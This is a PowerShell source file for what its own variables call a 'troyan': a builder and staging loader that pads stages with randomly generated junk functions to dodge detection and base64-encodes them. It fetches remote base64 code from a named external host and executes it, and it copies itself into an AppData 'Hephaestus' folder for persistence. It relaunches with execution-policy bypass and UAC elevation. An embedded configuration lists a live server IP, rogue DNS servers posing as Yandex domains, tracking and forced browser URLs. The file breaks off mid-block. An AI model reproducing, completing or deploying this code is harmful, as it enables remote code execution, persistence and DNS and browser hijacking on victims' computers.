
# ReRun function
function ReRun {
    param (
        [string]$arg,  # Additional argument to pass
        [bool]$uac     # Run with elevated privileges (UAC) or not
    )

    # Use the global script name and call RunMe to re-execute it
    $currentScriptName = (Split-Path -Leaf $global:PSScriptRoot)
    RunMe -script $currentScriptName -arg $arg -uac $uac
}


# function Elevate()
# { 
#   if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
#   {
#       ReRun -arg "" -uac $true
#       exit
#   }

#   try {
#     $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"

#   if (-not (Test-Path $registryPath)) {
#       New-Item -Path $registryPath -Force
#   }
#   Set-ItemProperty -Path $registryPath -Name "EnableScripts" -Value 1 -Type DWord
#   Set-ItemProperty -Path $registryPath -Name "ExecutionPolicy" -Value "Bypass" -Type String
#   writedbg "Registry values have been set successfully."
#   }
#   catch {

#   }

#   try {
#     $registryPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"

#   if (-not (Test-Path $registryPath)) {
#       New-Item -Path $registryPath -Force
#   }
#   Set-ItemProperty -Path $registryPath -Name "EnableScripts" -Value 1 -Type DWord
#   Set-ItemProperty -Path $registryPath -Name "ExecutionPolicy" -Value "Bypass" -Type String
#   writedbg "Registry values have been set successfully."
#   }
#   catch {

#   }

#   try {
#     Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force;
#   }
#   catch { 
#   }

#   try {
#     Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Bypass -Force;
#   }
#   catch {
#   }
# }
 $generalJob = Start-Job -ScriptBlock {




function BuldScript { param ([bool]$random)

    function get{
    param ([string]$name)
    
        $fn =Join-Path -Path $server.troyanScriptDir -ChildPath ($name + ".ps1")
        $contentBytes = [System.IO.File]::ReadAllBytes($fn)
        $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)
        return  "`n`n" + $contentWithoutBom +  "`n`n"
    }

    $pref = '

        function writedbg2 {
                param (
                    [string]$msg,   [string]$msg2=""
                )
            }
            '

    $suff = '

    ';

    $clean=""
    if ($random -eq $false)
    {
        $clean=".c"
    }

    $utils = get -name "utils"
    $consts_body = get -name "consts_body"
    $consts_embeddings = get -name "consts_embeddings"
    $consts_cert = get -name "consts_cert"

    function rnd {
        if ($random -eq $true)
        {
            return Generate-RandomCode
        }
        return ""
    }

    function make
    {
        param ([object]$cur, [object]$next)

        $fn = $cur.block
        $base = $server.updateUrlBlock
        $isJob = "`$false"
        if ($next.isJob){
              $isJob = "`$true"
        }
        $isWait = "`$false"
        if ($next.isWait){
            $isWait = "`$true"
        }
        $nextBlock = $next.block

        $fileContent =""

        if ($fn -eq "holder")
        {
        
            $rew = "

. ./consts_body.ps1
. ./utils.ps1

"
            Utf8NoBom -data $rew -file (Join-Path -Path $server.troyanScriptDir -ChildPath "holder.ps1")
        }

        $fileContent = (get -name $fn)
        
        if ($fn -ne "holder")
        {
            $fileContent +=  "
            
                ###GENERATED
                do_$fn
                
            ";
        }
        if ($null -ne $nextblock -and $nextblock -ne "")
        {
            $fileContent +=  "
    
            ###GENERATED
            RunRemote -baseUrl '$base' -isJob $isJob -isWait $isWait -block '$nextblock'
            
            ";
        }

        if ($fn -eq "holder")
        {
            $tarSrc=(Join-Path -Path $server.troyanScriptDir -ChildPath "holder.ps1")
            Utf8NoBom -data $fileContent -file $tarSrc
        }


        $fileContent = $fileContent -replace "\.\s+\./[^/]+\.ps1", "`n`n"
        $fileContent = $pref + (rnd) + $utils + (rnd) + $consts_body + (rnd) + $fileContent + $suff
        
        $outFile = Join-Path -Path $server.troyanOutputBlock -ChildPath ($fn + "$clean.ps1")
        if ($fn -eq "embeddings")
        {
            $fileContent = $consts_embeddings +  $fileContent
        }
        elseif ($fn -eq "cert")
        {
            $fileContent = $consts_cert +  $fileContent
        }

        Utf8NoBom -data $fileContent -file $outFile

        $encoded = Encode-FileToBase64 -inFile $outFile
        $outFile = Join-Path -Path $server.troyanOutputBlock -ChildPath ([System.IO.Path]::ChangeExtension($fn, ".txt"))
        Utf8NoBom -data $encoded -file $outFile
    }

    $units = @(
        [PSCustomObject]@{ block = "holder"; isJob = $true; isWait = $true},

        [PSCustomObject]@{ block = "autocopy"; isJob = $true; isWait = $true },

        [PSCustomObject]@{ block = "autoregistry"; isJob = $true; isWait = $true}


        # [PSCustomObject]@{ block = "dnsman"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "cert"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "chrome"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "edge"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "yandex"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "firefox"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "opera"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "chrome_ublock"; isJob = $true; isWait = $false }
        
        # [PSCustomObject]@{ block = "chrome_push"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "tracker"; isJob = $true; isWait = $false }

        # [PSCustomObject]@{ block = "extraupdate"; isJob = $true; isWait = $false }
    )
    

    for ($no = 0; $no -lt $units.Length; $no++)
    {
        $cur = $units[$no]
        $next = if ($no + 1 -lt $units.Count) { $units[$no + 1] } else { $null }
        if ($cur.isStop)
        {
            $next = $null
        }

        Write-Output "Iteration $no :"
        Write-Output "Current: Block = $($cur.block), isJob = $($cur.isJob), isWait = $($cur.isWait)"
        if ($null -ne $next) {
            Write-Output "Next: Block = $($next.block), isJob = $($next.isJob), isWait = $($next.isWait)"
        } else {
            Write-Output "Next: None"
        }
        
        make -cur $cur, -next $next 
        
        Write-Output "----"
    }
}





        function writedbg2 {
                param (
                    [string]$msg,   [string]$msg2=""
                )
            }
            function fn_Log_2Qb0B7Ym9s {
    param (
        [string]$message
    )
    writedbg2 'Log: $message'
}
function fn_1bQjkSF5RJ {
    param (
        [int]$var_TIZaqUuezY,
        [int]$var_hvPKx3zsb0
    )
    $result = $var_TIZaqUuezY + $var_hvPKx3zsb0
    return $result
}
function fn_XbWKdeyvoV {
    param (
        [int]$var_hvPKx3zsb0,
        [int]$var_Brx8zI0WtM
    )
    $result = $var_hvPKx3zsb0 + $var_Brx8zI0WtM
    return $result
}
function fn_HKYMTmOGEs {
    param (
        [int]$var_Brx8zI0WtM,
        [int]$var_rI5o1WsgGv
    )
    $result = $var_Brx8zI0WtM + $var_rI5o1WsgGv
    return $result
}
function fn_Y71azLcxA3 {
    param (
        [int]$var_rI5o1WsgGv,
        [int]$var_53MtAqPVlm
    )
    $result = $var_rI5o1WsgGv + $var_53MtAqPVlm
    return $result
}
function fn_EbkodsQPfi {
    param (
        [int]$var_53MtAqPVlm,
        [int]$var_TIZaqUuezY
    )
    $result = $var_53MtAqPVlm + $var_TIZaqUuezY
    return $result
}
if ($var_TIZaqUuezY -gt 13) {
    writedbg2 'WR5JsYa4HQwrXCx'
} else {
    writedbg2 'nv6wsVybQu8gf3D'
}
if ($var_hvPKx3zsb0 -gt 4) {
    writedbg2 'p9QZjfwJkCxh2nO'
} else {
    writedbg2 'xBw76VkQTRCoOnu'
}
if ($var_Brx8zI0WtM -gt 6) {
    writedbg2 'pj2PxB7rAQDalkh'
} else {
    writedbg2 'D8RWKI7tCPi9keg'
}
if ($var_rI5o1WsgGv -gt 8) {
    writedbg2 'geU0ksbNlonOMuY'
} else {
    writedbg2 'Iwz4d9BfG2oR8yp'
}
if ($var_53MtAqPVlm -gt 18) {
    writedbg2 '2LqxSYmgUo9ksiA'
} else {
    writedbg2 'XhnIiWfK0Mx8HRt'
}
$var_rI5o1WsgGv = fn_1bQjkSF5RJ -param1 37 -param2 64
writedbg2 'RQDTKzp5XSgoN2h'
$var_hvPKx3zsb0 = fn_1bQjkSF5RJ -param1 63 -param2 62
writedbg2 'LDcTinVWeCFXqIP'
$var_hvPKx3zsb0 = fn_HKYMTmOGEs -param1 64 -param2 40
writedbg2 '5O2iskWhyC9ZQf7'
$var_Brx8zI0WtM = fn_Y71azLcxA3 -param1 29 -param2 85
writedbg2 'ICnAmK2MiFDztgZ'
$var_53MtAqPVlm = fn_1bQjkSF5RJ -param1 29 -param2 70
writedbg2 'skDVqmwz94YuISi'
$var_rI5o1WsgGv = fn_XbWKdeyvoV -param1 88 -param2 21
writedbg2 '1DRoQGzxm8We4MK'
$var_rI5o1WsgGv = fn_Y71azLcxA3 -param1 13 -param2 93
writedbg2 'KejrVnbhQOAIdk2'
$var_53MtAqPVlm = fn_Y71azLcxA3 -param1 55 -param2 14
writedbg2 'r3iz7yKDgRNWT1b'
$var_Brx8zI0WtM = fn_Y71azLcxA3 -param1 97 -param2 45
writedbg2 'LoxcTEFeAXqNDHZ'
$var_hvPKx3zsb0 = fn_EbkodsQPfi -param1 84 -param2 91
writedbg2 'SrkeGTL2t9dhVoj'
$var_rI5o1WsgGv = fn_Y71azLcxA3 -param1 81 -param2 65
writedbg2 'pfY7iR03zdeI9Zb'
$var_hvPKx3zsb0 = fn_1bQjkSF5RJ -param1 50 -param2 92
writedbg2 'G93psroFfT5qg1b'
$var_hvPKx3zsb0 = fn_1bQjkSF5RJ -param1 57 -param2 7
writedbg2 'WhijsH1Xr0PoQkl'
$var_Brx8zI0WtM = fn_EbkodsQPfi -param1 78 -param2 58
writedbg2 'Fj82hoJ37XQSpKb'
$var_rI5o1WsgGv = fn_HKYMTmOGEs -param1 81 -param2 87
writedbg2 'PE2D915wKJYjlqT'
$var_Brx8zI0WtM = fn_1bQjkSF5RJ -param1 76 -param2 26
writedbg2 'swA6CybWGodYKvO'
$var_53MtAqPVlm = fn_EbkodsQPfi -param1 17 -param2 73
writedbg2 'iEpowJeCAKRlQ6z'
$var_53MtAqPVlm = fn_HKYMTmOGEs -param1 41 -param2 79
writedbg2 'LWketHl4yYIE08p'
$var_rI5o1WsgGv = fn_Y71azLcxA3 -param1 59 -param2 85
writedbg2 'CAUsOX5dVoy3qLe'
$var_Brx8zI0WtM = fn_Y71azLcxA3 -param1 44 -param2 45
writedbg2 '5wxmUgjYnfXoqsu'
 



function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$globalDebug = IsDebug;

function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Utf8NoBom {
    param (
        [string]$data,
        [string]$file
    )
    $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
    $streamWriter.Write($data)
    $streamWriter.Close()
    $writtenContent = [System.IO.File]::ReadAllBytes($file)
    if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
        $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
    }
    [System.IO.File]::WriteAllBytes($file, $writtenContent)
}

function GetUtfNoBom {
    param (
        [string]$file
    )

    $contentBytes = [System.IO.File]::ReadAllBytes($file)

    if ($contentBytes.Length -ge 3 -and $contentBytes[0] -eq 0xEF -and $contentBytes[1] -eq 0xBB -and $contentBytes[2] -eq 0xBF) {
        $contentBytes = $contentBytes[3..($contentBytes.Length - 1)]
    }
    $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)

    return $contentWithoutBom
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath 'Hephaestus'
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'holder' + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-SomePath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'some' + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'body' + '.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function ExtractEmbedding {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $decodedBytes = [Convert]::FromBase64String($inContent)
    [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 

function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function RunMe {
    param (
        [string]$script, 
        [string]$arg,
        [bool]$uac
    )

    try 
    {
        $scriptPath = $script
        
        $localArguments = @("-ExecutionPolicy Bypass")
        
        $globalArgs = $global:args
        foreach ($globalArg in $globalArgs) {
            $localArguments += "-Argument `"$globalArg`""
        }

        if (-not [string]::IsNullOrEmpty($arg)) {
            $localArguments += "-$arg"
        }

        $localArgumentList = @("-File", "`"D:\Hephaestus\holder.ps1`"") + $localArguments
        
        if ($uac -eq $true) {
            powershell -ExecutionPolicy Bypass -Command "Start-Process Powershell -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `"$PWD\example.ps1`" -$arg'"
            Start-Process powershell.exe -ArgumentList $localArgumentList -Verb RunAs #-WindowStyle Hidden
        } else {
            Start-Process powershell.exe -ArgumentList $localArgumentList #-WindowStyle Hidden
        }
    }
    catch {
          writedbg "RunMe $_"
    }
}

function IsElevated
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}


function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}

function Get-TempPs {
    # Generate a unique temporary file name in the temp directory
    $tempFile = [System.IO.Path]::GetTempFileName()

    # Change the file extension to .ps1
    $ps1TempFile = [System.IO.Path]::ChangeExtension($tempFile, ".ps1")

    return $ps1TempFile
}

# never change def values
function RunRemote {
    param (
        [string]$baseUrl,
        [string]$block,
        [string]$param = $null,
        [bool]$isWait = $true,
        [bool]$isJob = $false
    )
    $cmd = "do_$block"
    if ($param -ne $null)
    {
        $cmd += " -param '$param'"
    }
    $url = "$baseUrl$block.txt"
    $timeout = [datetime]::UtcNow.AddMinutes(5)
    $delay = 10
    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
            if ($response.StatusCode -eq 200) {
                $scriptData = $response.Content
                $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData)) + "`n`n" + $cmd
                if ($globalDebug)
                {
                    try {
                        Utf8NoBom -data $scriptData -file "D:\Hephaestus\temp_$block.ps1"      
                    }
                     catch {
                    }
                }
                $codeBlock = [ScriptBlock]::Create($scriptData)
                if ($isJob) {
                    $generalJob = Start-Job -ScriptBlock $codeBlock
                    if ($isWait) {
                        Wait-Job -Job $generalJob -Timeout 300 | Out-Null
                        if ($generalJob.State -eq 'Completed') {
                            $result = Receive-Job -Job $generalJob
                            Remove-Job -Job $generalJob
                            return $result
                        } else {
                            writedbg "Job did not complete within the timeout period."
                            Remove-Job -Job $generalJob
                            return
                        }
                    } else {
                        return
                    }
                } else {
                    $codeBlock = [ScriptBlock]::Create($scriptData)
                    Invoke-Command -ScriptBlock $codeBlock
                    return
                }
            }
        } catch {
            writedbg "Failed to runremote $url $_"
        } 
        Start-Sleep -Seconds $delay
    } 
    writedbg "Failed to run remote $url within the allotted time."
}

function RunRemoteAsync {
    param (
        [string]$baseUrl,
        [string]$block,
        [string]$param = $null
    )
    $url = "$baseUrl/$block.txt"
    $cmd = "do_$block"
    if ($param -ne $null)
    {
        $cmd += " -param '$param'"
    }
    $asyncJob = Start-Job -ScriptBlock {
        param (
            [string]$url, [string]$block, [string]$cmd, [bool]$debug
        )

        function Utf8NoBom {
            param (
                [string]$data,
                [string]$file
            )
            $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
            $streamWriter.Write($data)
            $streamWriter.Close()
            $writtenContent = [System.IO.File]::ReadAllBytes($file)
            if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
                $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
            }
            [System.IO.File]::WriteAllBytes($file, $writtenContent)
        }

        $timeout = [datetime]::UtcNow.AddMinutes(5)
        $delay = 10
        while ([datetime]::UtcNow -lt $timeout) {
            try {
                $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
                if ($response.StatusCode -eq 200) {
                    $scriptData = $response.Content
                    $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData)) + "`n`n" + $cmd
                    if ($debug)
                    {
                        try {
                            Utf8NoBom -data $scriptData -file "D:\Hephaestus\temp_$block.ps1"      
                        }
                         catch {
                        }
                    }
                    Invoke-Expression -Command $scriptData
                    return
                }
            } catch {
                Write-Output $_
            } 
            Start-Sleep -Seconds $delay
        }
    } -ArgumentList $url, $block, $cmd, $globalDebug
    return $asyncJob
}

function Convert-StringToBase64 {
    param (
        [Parameter(Mandatory = $true)]
        [string]$InputString
    )
    
    # Convert the string to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    
    # Encode the bytes to a Base64 string
    $base64String = [Convert]::ToBase64String($bytes)
    
    # Return the Base64-encoded string
    return $base64String
}

function fn_Log_YIGg3rH8Bt {
    param (
        [string]$message
    )
    writedbg2 'Log: $message'
}
function fn_LHA0QfCrMl {
    param (
        [int]$var_qx1EJdg4W8,
        [int]$var_GFUSwOzhuJ
    )
    $result = $var_qx1EJdg4W8 + $var_GFUSwOzhuJ
    return $result
}
function fn_IteLKRnYUk {
    param (
        [int]$var_GFUSwOzhuJ,
        [int]$var_ypgJUfs9ab
    )
    $result = $var_GFUSwOzhuJ + $var_ypgJUfs9ab
    return $result
}
function fn_FBIwHq10Tn {
    param (
        [int]$var_ypgJUfs9ab,
        [int]$var_motflBvFiS
    )
    $result = $var_ypgJUfs9ab + $var_motflBvFiS
    return $result
}
function fn_QrIP2zpfKH {
    param (
        [int]$var_motflBvFiS,
        [int]$var_estlRCT5IY
    )
    $result = $var_motflBvFiS + $var_estlRCT5IY
    return $result
}
function fn_mlXkyN5oUr {
    param (
        [int]$var_estlRCT5IY,
        [int]$var_qx1EJdg4W8
    )
    $result = $var_estlRCT5IY + $var_qx1EJdg4W8
    return $result
}
if ($var_qx1EJdg4W8 -gt 9) {
    writedbg2 'HGNdoyVuEXpI56W'
} else {
    writedbg2 'ELxbXT3gt04m8Kh'
}
if ($var_GFUSwOzhuJ -gt 2) {
    writedbg2 'SxgqD1iAFOLBeCp'
} else {
    writedbg2 'ZW89JlpuAVEgvay'
}
if ($var_ypgJUfs9ab -gt 10) {
    writedbg2 'y4OhSfwMWk7raqm'
} else {
    writedbg2 'vLaM31kFzjTrJ0A'
}
if ($var_motflBvFiS -gt 12) {
    writedbg2 'gBQ3h1cDMqJvnzp'
} else {
    writedbg2 'vQ5mapcMLiDuErI'
}
if ($var_estlRCT5IY -gt 1) {
    writedbg2 '3CiV9jEumlv6O8p'
} else {
    writedbg2 'sNBMtPiHFVTxnpc'
}
$var_estlRCT5IY = fn_QrIP2zpfKH -param1 32 -param2 36
writedbg2 'x6dFR8JN24p0SMG'
$var_qx1EJdg4W8 = fn_QrIP2zpfKH -param1 44 -param2 30
writedbg2 '3tyeNXGaMAZrWIP'
$var_GFUSwOzhuJ = fn_IteLKRnYUk -param1 97 -param2 20
writedbg2 'S1r7VmR6Y238OQB'
$var_GFUSwOzhuJ = fn_LHA0QfCrMl -param1 73 -param2 42
writedbg2 'JHMx7Ed5pFNgh0n'
$var_motflBvFiS = fn_mlXkyN5oUr -param1 26 -param2 28
writedbg2 '5qJS9EtOuABw4dj'
$var_GFUSwOzhuJ = fn_FBIwHq10Tn -param1 42 -param2 64
writedbg2 '1Oq9ZtRDwm2uHg0'
$var_qx1EJdg4W8 = fn_mlXkyN5oUr -param1 58 -param2 17
writedbg2 'Lv3eYImju5Nh2rR'
$var_qx1EJdg4W8 = fn_LHA0QfCrMl -param1 89 -param2 74
writedbg2 'iMv0peJmFKdg4xu'
$var_ypgJUfs9ab = fn_FBIwHq10Tn -param1 18 -param2 20
writedbg2 'Kr2wWy3iztMBEIO'
$var_ypgJUfs9ab = fn_LHA0QfCrMl -param1 85 -param2 14
writedbg2 'z3m2R5yJWvsFuAa'
$var_estlRCT5IY = fn_IteLKRnYUk -param1 98 -param2 99
writedbg2 'datxiALmIsNnpVZ'
$var_GFUSwOzhuJ = fn_FBIwHq10Tn -param1 6 -param2 48
writedbg2 'mLrh9jvPBVgpYSc'
$var_motflBvFiS = fn_FBIwHq10Tn -param1 27 -param2 8
writedbg2 'a2FHUIeLu6Mslwg'
$var_GFUSwOzhuJ = fn_IteLKRnYUk -param1 44 -param2 17
writedbg2 '4Z2Q5o3DeHciqGd'
$var_ypgJUfs9ab = fn_FBIwHq10Tn -param1 27 -param2 25
writedbg2 'lV3rQ7KLYgcof6h'
$var_motflBvFiS = fn_QrIP2zpfKH -param1 16 -param2 83
writedbg2 'RNGK8sYFIdovbQc'
$var_motflBvFiS = fn_mlXkyN5oUr -param1 92 -param2 45
writedbg2 'vojKJhz4YCNRgFZ'
$var_qx1EJdg4W8 = fn_mlXkyN5oUr -param1 24 -param2 74
writedbg2 'KHPfxWYTjy0X98E'
$var_motflBvFiS = fn_IteLKRnYUk -param1 70 -param2 5
writedbg2 'PnxkpFD83ItYwKV'
$var_motflBvFiS = fn_FBIwHq10Tn -param1 32 -param2 90
writedbg2 'Kl7VRz2BtLQCgoZ'
 

    $server = '{
    "disabled":  false,
    "disableVirus":  false,
    "htmlTemplateSponsorFile":  "C:\\inetpub\\wwwroot\\php\\.\\download.html",
    "UpdateFile":  null,
    "server":  "185.247.141.125",
    "strahServer":  null,
    "dnVbsLinkShort":  "185.247.141.125/default/MiP8mDdSJC/none/GetVbs",
    "dnVbsLink":  "http://2.superhost.pw/185.247.141.125/default/KpTNj3hjUS/none/GetVbs",
    "updateUrl":  "http://2.superhost.pw/update",
    "updateUrlFolder":  "http://2.superhost.pw/data/",
    "updateUrlBlock":  "http://2.superhost.pw/data/block/",
    "primaryDns":  "185.247.141.127",
    "secondaryDns":  "185.247.141.126",
    "track":  true,
    "trackSerie":  "test1",
    "trackDesktop":  false,
    "trackUrl":  "http://2.superhost.pw/upsert",
    "autoStart":  true,
    "autoUpdate":  true,
    "domains":  [
                    "mc.yandex.ru",
                    "mc.yandex.com"
                ],
    "ipDomains":  {
                      "185.247.141.127":  "mc.yandex.ru",
                      "185.247.141.126":  "mc.yandex.com"
                  },
    "pushesForce":  true,
    "pushes":  [
                   "https://megafon.ru"
               ],
    "startDownloadsForce":  false,
    "startDownloads":  [

                       ],
    "startUrlsForce":  true,
    "startUrls":  [
                      "https://tele2.ru"
                  ],
    "frontForce":  false,
    "front":  [

              ],
    "embeddingsForce":  false,
    "embeddings":  [

                   ],
    "isValid":  false,
    "extraUpdate":  false,
    "extraUpdateUrl":  null
}' | ConvertFrom-Json



function fn_Log_QB3pAmCOPZ {
    param (
        [string]$message
    )
    writedbg2 'Log: $message'
}
function fn_eAMdf5DQWx {
    param (
        [int]$var_6Pci5v2Bhb,
        [int]$var_VroS0PIQEj
    )
    $result = $var_6Pci5v2Bhb + $var_VroS0PIQEj
    return $result
}
function fn_xt7Q9ze0wW {
    param (
        [int]$var_VroS0PIQEj,
        [int]$var_ntIHPDC4iE
    )
    $result = $var_VroS0PIQEj + $var_ntIHPDC4iE
    return $result
}
function fn_EJ8Mav39oQ {
    param (
        [int]$var_ntIHPDC4iE,
        [int]$var_olPrCNVid7
    )
    $result = $var_ntIHPDC4iE + $var_olPrCNVid7
    return $result
}
function fn_Zd6cg1V8qT {
    param (
        [int]$var_olPrCNVid7,
        [int]$var_XZj1bJ6pdc
    )
    $result = $var_olPrCNVid7 + $var_XZj1bJ6pdc
    return $result
}
function fn_OEGpQuIAwr {
    param (
        [int]$var_XZj1bJ6pdc,
        [int]$var_6Pci5v2Bhb
    )
    $result = $var_XZj1bJ6pdc + $var_6Pci5v2Bhb
    return $result
}
if ($var_6Pci5v2Bhb -gt 8) {
    writedbg2 'NsGzKihW6nPyQaU'
} else {
    writedbg2 'raDZ8j1F0KwWuUM'
}
if ($var_VroS0PIQEj -gt 13) {
    writedbg2 'o9LcBPtr3w2dIbx'
} else {
    writedbg2 '8ZrO4jxi06uaWpM'
}
if ($var_ntIHPDC4iE -gt 17) {
    writedbg2 'ur38EbWq0UwSjvF'
} else {
    writedbg2 'BzmIlTp0fyxs9Zb'
}
if ($var_olPrCNVid7 -gt 8) {
    writedbg2 'qWdYsKELZejfgFm'
} else {
    writedbg2 'ySnAtXCmKg1uUbD'
}
if ($var_XZj1bJ6pdc -gt 14) {
    writedbg2 'REX0ahrDvHlecqS'
} else {
    writedbg2 'FkLV9Kom4cQJAlR'
}
$var_XZj1bJ6pdc = fn_eAMdf5DQWx -param1 16 -param2 93
writedbg2 'mN69vaQhOpK5YeH'
$var_6Pci5v2Bhb = fn_OEGpQuIAwr -param1 76 -param2 63
writedbg2 'VWHOgPSGJeK901s'
$var_XZj1bJ6pdc = fn_eAMdf5DQWx -param1 93 -param2 1
writedbg2 '4576ugDebxJ120a'
$var_6Pci5v2Bhb = fn_EJ8Mav39oQ -param1 34 -param2 13
writedbg2 'Q6kpCmq2niYDGH8'
$var_ntIHPDC4iE = fn_xt7Q9ze0wW -param1 25 -param2 96
writedbg2 '8c7391EVSQdnB4k'
$var_ntIHPDC4iE = fn_Zd6cg1V8qT -param1 61 -param2 8
writedbg2 'CTGkzQYo4IbS8sm'
$var_ntIHPDC4iE = fn_xt7Q9ze0wW -param1 60 -param2 59
writedbg2 '1niZTmsGlILCOS9'
$var_XZj1bJ6pdc = fn_Zd6cg1V8qT -param1 75 -param2 79
writedbg2 'U6Nr5W0ecJxAFOz'
$var_ntIHPDC4iE = fn_OEGpQuIAwr -param1 11 -param2 41
writedbg2 '5lvRICOFQ1qztVH'
$var_ntIHPDC4iE = fn_EJ8Mav39oQ -param1 87 -param2 44
writedbg2 'zY8JNGZcuECBmyj'
$var_XZj1bJ6pdc = fn_OEGpQuIAwr -param1 38 -param2 48
writedbg2 'vesDwaBEhSkP1GW'
$var_XZj1bJ6pdc = fn_Zd6cg1V8qT -param1 72 -param2 45
writedbg2 'lPf9Qw8xeXjJA5u'
$var_VroS0PIQEj = fn_xt7Q9ze0wW -param1 34 -param2 72
writedbg2 'JPzxnAqYwpLv4VT'
$var_6Pci5v2Bhb = fn_OEGpQuIAwr -param1 88 -param2 4
writedbg2 'cz2BHmgRQp3bSIT'
$var_olPrCNVid7 = fn_eAMdf5DQWx -param1 42 -param2 27
writedbg2 '0lvYNaL9BxW1j4U'
$var_ntIHPDC4iE = fn_eAMdf5DQWx -param1 98 -param2 53
writedbg2 '85GYiHedKTV4MFB'
$var_olPrCNVid7 = fn_OEGpQuIAwr -param1 38 -param2 21
writedbg2 'ScVLEvYyN67oK1g'
$var_6Pci5v2Bhb = fn_OEGpQuIAwr -param1 84 -param2 12
writedbg2 'Cx0BU1Yu5Dmwgh6'
$var_ntIHPDC4iE = fn_OEGpQuIAwr -param1 29 -param2 90
writedbg2 'T2cLh3SkYQ15Jmn'
$var_ntIHPDC4iE = fn_EJ8Mav39oQ -param1 1 -param2 52
writedbg2 'kanI8VjElJuQAyO'
 








#holderX

$globalArgs = $global:args -join ' '
$holderPath = Get-HolderPath
if (-not ($globalArgs -like "*guimode*" -or $globalArgs -like "*elevated" -or $globalArgs -like "*autostart"))
{
    try 
    {
        if (1 -eq 1 -or (-not (Test-Path $holderPath)))
        {
            $holderFolder = Get-HephaestusFolder  
            $pathOrData = $MyInvocation.MyCommand.Definition
            if ($pathOrData -like "*holderX*")
            {
            } 
            else 
            {
                $pathOrData = $PSCommandPath
                if (-not (Test-Path $pathOrData))
                {
                    $pathOrData = $MyInvocation.MyCommand.Path
                }
                if (Test-Path $pathOrData)
                {    
                    $pathOrData = GetUtfNoBom -file $pathOrData
                } else 
                {
                    $pathOrData = $pathOrData
                }
            } 
            if (-not (Test-Path $holderFolder)) {
                New-Item -Path $holderFolder -ItemType Directory | Out-Null
            }
            $holderFolder = Get-HephaestusFolder
            $job = Start-Job -ScriptBlock {
                param (
                    [string]$holderPath, [string]$holderFolder, [string]$pathOrData)
                    Set-Content -Path $holderPath -Value $pathOrData -Force
            } -ArgumentList $holderPath, $holderFolder, $pathOrData
            Receive-Job -Job $job
            Wait-Job -Job $job -Timeout 300 | Out-Null
